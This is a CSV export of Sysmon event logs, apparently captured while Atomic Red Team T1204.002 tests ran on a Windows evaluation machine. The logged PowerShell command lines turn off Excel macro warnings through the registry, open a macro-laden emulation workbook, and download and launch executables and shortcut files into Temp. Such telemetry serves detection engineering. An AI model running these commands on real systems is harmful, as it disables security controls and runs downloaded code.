Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,EventID,EventRecordID,FileVersion,Hashes,Image,Initiated,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Message,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,Protocol,QueryName,QueryResults,QueryStatus,RenderingInfo,RuleName,SourceHostname,SourceIp,SourceIsIpv6,SourcePort,SourcePortName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\appidcertstorecheck.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,AppID Certificate Store Verification Task,,,,,,1,19617,10.0.22621.2506 (WinBuild.160101.0800),"MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6",C:\Windows\System32\appidcertstorecheck.exe,,System,0x8000000000000000,Information,{f57bd86a-36f6-658c-e503-000000000000},0x3e5,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:18.408

ProcessGuid: {f57bd86a-a412-658c-e201-000000000f00}

ProcessId: 2960

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM",Info,AppIDCertstoreCheck.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,C:\Windows\System32\svchost.exe,{f57bd86a-36f6-658c-1d00-000000000f00},1496,NT AUTHORITY\SYSTEM,{f57bd86a-a412-658c-e201-000000000f00},3588,2960,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:24:18.4121111Z,,Process Create (rule: ProcessCreate),0,5124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 22:24:18.408,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:18.4121111Z""/>
      <EventRecordID>19617</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:24:18.408</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a412-658c-e201-000000000f00}</Data>
      <Data Name=""ProcessId"">2960</Data>
      <Data Name=""Image"">C:\Windows\System32\appidcertstorecheck.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">AppID Certificate Store Verification Task</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">AppIDCertstoreCheck.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\appidcertstorecheck.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f6-658c-e503-000000000000}</Data>
      <Data Name=""LogonId"">0x3e5</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f6-658c-1d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1496</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:18.408

ProcessGuid: {f57bd86a-a412-658c-e201-000000000f00}

ProcessId: 2960

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:24:09.567,,,,,,,,11,19616,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:24:09.569

ProcessGuid: {f57bd86a-a409-658c-e001-000000000f00}

ProcessId: 11244

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_w3mrnup3.ddq.ps1

CreationUtcTime: 2023-12-27 22:24:09.567

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a409-658c-e001-000000000f00},3588,11244,,,,,,"
      ",-,,,,,,2023-12-27T22:24:09.5700559Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_w3mrnup3.ddq.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:24:09.569,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:09.5700559Z""/>
      <EventRecordID>19616</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:24:09.569</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a409-658c-e001-000000000f00}</Data>
      <Data Name=""ProcessId"">11244</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_w3mrnup3.ddq.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:24:09.567</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:24:09.569

ProcessGuid: {f57bd86a-a409-658c-e001-000000000f00}

ProcessId: 11244

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_w3mrnup3.ddq.ps1

CreationUtcTime: 2023-12-27 22:24:09.567

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Cd \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\""""
New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name \""""VBAWarnings\"""" -Value \""""1\"""" -PropertyType DWORD -Force | Out-Null
& '.\Excel 2016.lnk' \""""C:\AtomicRedTeam\atomics\T1204.002\bin\mirrorblast_emulation.xlsm\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19615,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:09.452

ProcessGuid: {f57bd86a-a409-658c-e001-000000000f00}

ProcessId: 11244

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Cd \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\""""
New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name \""""VBAWarnings\"""" -Value \""""1\"""" -PropertyType DWORD -Force | Out-Null
& '.\Excel 2016.lnk' \""""C:\AtomicRedTeam\atomics\T1204.002\bin\mirrorblast_emulation.xlsm\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-a409-658c-e001-000000000f00},3588,11244,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:24:09.4534883Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:24:09.452,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:09.4534883Z""/>
      <EventRecordID>19615</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:24:09.452</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a409-658c-e001-000000000f00}</Data>
      <Data Name=""ProcessId"">11244</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Cd \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\""""
New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name \""""VBAWarnings\"""" -Value \""""1\"""" -PropertyType DWORD -Force | Out-Null
&amp; '.\Excel 2016.lnk' \""""C:\AtomicRedTeam\atomics\T1204.002\bin\mirrorblast_emulation.xlsm\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:09.452

ProcessGuid: {f57bd86a-a409-658c-e001-000000000f00}

ProcessId: 11244

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Cd \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\""""
New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name \""""VBAWarnings\"""" -Value \""""1\"""" -PropertyType DWORD -Force | Out-Null
&amp; '.\Excel 2016.lnk' \""""C:\AtomicRedTeam\atomics\T1204.002\bin\mirrorblast_emulation.xlsm\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,5,19614,,,C:\Users\User\AppData\Local\Temp\a.exe,,,0x8000000000000000,Information,,,"Process terminated:

RuleName: -

UtcTime: 2023-12-27 22:24:09.169

ProcessGuid: {f57bd86a-a407-658c-de01-000000000f00}

ProcessId: 3660

Image: C:\Users\User\AppData\Local\Temp\a.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a407-658c-de01-000000000f00},3588,3660,,,,,,"
      ",-,,,,,,2023-12-27T22:24:09.1806574Z,,Process terminated (rule: ProcessTerminate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:24:09.169,3,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>5</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>5</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:09.1806574Z""/>
      <EventRecordID>19614</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:24:09.169</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a407-658c-de01-000000000f00}</Data>
      <Data Name=""ProcessId"">3660</Data>
      <Data Name=""Image"">C:\Users\User\AppData\Local\Temp\a.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process terminated:

RuleName: -

UtcTime: 2023-12-27 22:24:09.169

ProcessGuid: {f57bd86a-a407-658c-de01-000000000f00}

ProcessId: 3660

Image: C:\Users\User\AppData\Local\Temp\a.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process terminated (rule: ProcessTerminate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\taskkill.exe"" /IM a.exe /F",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Terminates Processes,,,,,,1,19613,10.0.22621.1 (WinBuild.160101.0800),"MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC",C:\Windows\System32\taskkill.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:09.096

ProcessGuid: {f57bd86a-a409-658c-df01-000000000f00}

ProcessId: 8180

Image: C:\Windows\System32\taskkill.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Terminates Processes

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: taskkill.exe

CommandLine: ""C:\Windows\system32\taskkill.exe"" /IM a.exe /F

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC

ParentProcessGuid: {f57bd86a-a3fd-658c-d801-000000000f00}

ParentProcessId: 2948

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {Invoke-WebRequest -OutFile $env:Temp\test10.lnk \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\""""
$file1 = \""""$env:Temp\test10.lnk\""""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F}

ParentUser: WINDEV2309EVAL\User",Info,taskkill.exe,"""powershell.exe"" & {Invoke-WebRequest -OutFile $env:Temp\test10.lnk \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\""""
$file1 = \""""$env:Temp\test10.lnk\""""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-a3fd-658c-d801-000000000f00},2948,WINDEV2309EVAL\User,{f57bd86a-a409-658c-df01-000000000f00},3588,8180,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T22:24:09.1008257Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:24:09.096,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:24:09.1008257Z""/>
      <EventRecordID>19613</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:24:09.096</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a409-658c-df01-000000000f00}</Data>
      <Data Name=""ProcessId"">8180</Data>
      <Data Name=""Image"">C:\Windows\System32\taskkill.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Terminates Processes</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">taskkill.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\taskkill.exe"" /IM a.exe /F</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a3fd-658c-d801-000000000f00}</Data>
      <Data Name=""ParentProcessId"">2948</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {Invoke-WebRequest -OutFile $env:Temp\test10.lnk \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\""""
$file1 = \""""$env:Temp\test10.lnk\""""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:09.096

ProcessGuid: {f57bd86a-a409-658c-df01-000000000f00}

ProcessId: 8180

Image: C:\Windows\System32\taskkill.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Terminates Processes

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: taskkill.exe

CommandLine: ""C:\Windows\system32\taskkill.exe"" /IM a.exe /F

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=050ED22BB515A81ED6FC73D042CE5DB4,SHA256=75F4AED9BF21D8F9B2B1A2DDBC1F2C7E4E0AEF8B3B94BD5EDA02D9D84C34F33F,IMPHASH=86AA9A65A9C8E606B1E09C96AE58BACC

ParentProcessGuid: {f57bd86a-a3fd-658c-d801-000000000f00}

ParentProcessId: 2948

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {Invoke-WebRequest -OutFile $env:Temp\test10.lnk \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\""""
$file1 = \""""$env:Temp\test10.lnk\""""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Users\User\AppData\Local\Temp\a.exe"" ",Simon Tatham,WinDev2309Eval,,C:\Windows\System32\WindowsPowerShell\v1.0\,"SSH, Telnet, Rlogin, and SUPDUP client",,,,,,1,19612,Release 0.80 (with embedded help),"MD5=A9C5924063A253F64FB86BC924BE6996,SHA256=EB1B278B91A8F183F9749948ABD9556EC21B03CA852C53E423D824D5D7CC3DE4,IMPHASH=69573714E11441683EA863C40A1C0D54",C:\Users\User\AppData\Local\Temp\a.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:24:07.446

ProcessGuid: {f57bd86a-a407-658c-de01-000000000f00}

ProcessId: 3660

Image: C:\Users\User\AppData\Local\Temp\a.exe

FileVersion: Release 0.80 (with embedded help)

Description: SSH, Telnet, Rlogin, and SUPDUP client

Product: PuTTY suite

Company: Simon Tatham

OriginalFileName: PuTTY

CommandLine: ""C:\Users\User\AppData\Local\Temp\a.exe"" 

CurrentDirectory: C:\Windows\System32\WindowsPowerShell\v1.0\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=A9C5924063A253F64FB86BC924BE6996,SHA256=EB1B278B91A8F183F9749948ABD9556EC21B03CA852C53E423D824D5D7CC3DE4,IMPHASH=69573714E11441683EA863C40A1C0D54

ParentProcessGuid: {f57bd86a-a3ff-658c-da01-000000000f00}

ParentProcessId: 3344

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe

ParentUser: WINDEV2309EVAL\User",Info,PuTTY,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\a.exe;start-process $env:TEMP\a.exe",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-a3ff-658c-da01-000000000f00},3344,WINDEV2309EVAL\User,{f57bd86a-a407-658c-de01-000000000f00},3588,3660,PuTTY suite,,,,,"
      ",-,,,,,,2023-12-27T22:24:07.4574046Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:24:07.446,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
